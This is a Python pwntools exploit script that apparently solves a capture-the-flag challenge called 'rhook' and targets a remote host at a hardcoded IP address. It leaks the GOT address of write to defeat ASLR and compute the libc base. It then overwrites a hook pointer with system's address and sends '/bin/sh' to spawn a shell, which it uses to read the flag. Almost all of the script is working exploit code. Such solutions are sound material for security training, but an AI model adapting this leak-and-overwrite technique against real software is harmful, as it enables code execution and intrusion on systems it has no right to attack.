#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rhook.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11654)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

libc = ELF("./libc.so.6")
# libc = ELF("./libc6_2.31-3_amd64.so")

save_name_hook = 0x601090

write_addr_got = exe.got["write"]

io.recvuntil("Enter address:\n")
io.sendline(str(write_addr_got))

write_addr_leak = u64(io.recv(numb=8))
log.info(f"Write: {hex(write_addr_leak)}")
LIBC_base = write_addr_leak - libc.sym["write"]
libc.address = LIBC_base
log.info(f"Libc base: {hex(LIBC_base)}")
system_address = libc.sym["system"]

io.recvuntil("Enter address:\n")
io.sendline(str(save_name_hook))

io.recvuntil("Now enter your bytes:\n")
io.send(p64(system_address)) # DONT FUCKIN' SENDLINE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

io.recvuntil("enter your name:\n")
io.sendline(b"/bin/sh")

io.sendline("cat flag")

io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

# io.interactive()

io.close()

